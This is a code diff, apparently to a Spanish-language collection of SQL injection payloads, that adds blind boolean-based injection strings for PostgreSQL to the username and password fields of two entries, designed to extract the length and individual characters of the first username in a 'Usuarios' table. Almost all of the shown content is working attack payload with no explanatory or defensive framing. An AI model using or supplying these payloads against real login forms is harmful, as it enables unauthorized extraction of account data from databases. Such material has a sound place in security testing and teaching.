@@ -145,8 +145,8 @@ sql_injections = {
             },
             {
                 "nombre":"Sacando la longitud de un campo (PostgreSQL)",
-                "usuario":"",
-                "password":""
+                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --",
+                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --"
             },
             {
                 "nombre":"Sacando un carácter de un campo (Oracle)",
@@ -155,8 +155,8 @@ sql_injections = {
             },
             {
                 "nombre":"Sacando un carácter de un campo (PostgreSQL)",
-                "usuario":"",
-                "password":""
+                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTRING(username FROM 1 FOR 1) = 'a') THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --",
+                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTRING(username FROM 1 FOR 1) = 'z') THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --"
             }
         ],
         "usuario": "admin",
